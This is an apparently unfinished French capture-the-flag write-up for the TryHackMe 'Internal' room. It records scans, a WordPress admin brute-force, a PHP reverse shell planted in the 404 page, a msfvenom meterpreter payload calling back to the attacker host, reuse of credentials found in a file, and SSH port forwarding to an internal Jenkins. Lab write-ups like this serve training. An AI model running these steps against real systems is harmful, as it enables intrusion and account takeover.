# Room : Internal
IP :

je finirais le write-up plus tard...

# Enum / Reconnaissance
## Nmap
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 08:59 EDT
Nmap scan report for 10.10.116.71
Host is up (0.033s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
```
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://10.10.116.71/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.116.71/wordpress/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.116.71/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.116.71/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
```
En refaisant un gobuster sur la page /blog je trouve d'autre information utile:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 322] [--> http://10.10.116.71/blog/wp-content/]
/wp-includes          (Status: 301) [Size: 323] [--> http://10.10.116.71/blog/wp-includes/]
/wp-admin             (Status: 301) [Size: 320] [--> http://10.10.116.71/blog/wp-admin/]
```

En testant la page wp-admin avec un compte admin/admin, j'ai l'identifiant : admin
Celui-ci me retourne cette erreur : 
**Error: The password you entered for the username admin is incorrect. Lost your password?**
Il conforme que c'est bien **admin**

## WPScan
```
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.116.71/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.116.71/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.116.71/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.116.71/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.116.71/wordpress/, Match: 'WordPress 5.4.2'
```

WordPress version 5.4.2

# Exploit Wordpress
Je trouve le compte admin du wordpress après l'avoir bruteforce

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / my2boys                               

On edite la page 404 et on y met un reverse shell php

On provoque une erreur 404 et le shell s'ouvre.

```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Internal]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.59.209] from (UNKNOWN) [10.10.116.71] 55198
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:29:46 up 33 min,  0 users,  load average: 0.00, 0.19, 0.26
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

Pour le fun on test de créer un shell en .elf avec msfvenom
puis on récupère un shell stable avec metasploit

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.14.59.209 LPORT=4445 -f elf > shell.elf
```
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.14.59.209:4445 
[*] Sending stage (1017704 bytes) to 10.10.116.71
[*] Meterpreter session 1 opened (10.14.59.209:4445 -> 10.10.116.71:57692) at 2023-09-04 09:33:19 -0400

meterpreter >
```

# Privesc to user !
Sur le serveur on trouve un fichier **wp-save.txt** dans le dossier **/opt** qui semble interessant.

```
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
effectivement, il y a des cred dedans !
# Privesc to root !
Ce compte permet un acces via SSH avec la session de Aubreanna

1er flag présent sur le bureau :
```
THM{*************}
```

Linpeas trouve :

```
╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                      
                                                                                                                                                                                
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
```

Mais inutile.

Dans le home de Aubreanna il y a un fichier **jenkins.txt** qui contient :
```
Internal Jenkins service is running on 172.17.0.2:8080
```
Il y a bien quelques chose quand on curl dessus:

```
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


Authentication required
<!--
You are authenticated as: anonymous
Groups that you are in:
  
Permission you need to have (but didn't): hudson.model.Hudson.Read
 ... which is implied by: hudson.security.Permission.GenericRead
 ... which is implied by: hudson.model.Hudson.Administer
-->

</body></html>
```
On va renvoyer le flux web vers moi via un SSH
```
ssh -L 4545:172.17.0.2:8080 aubreanna@10.10.116.71
```
Maintenant, depuis le navigateur, avec l'url **localhost:4545** on vois le résultat de **172.17.0.2:8080**
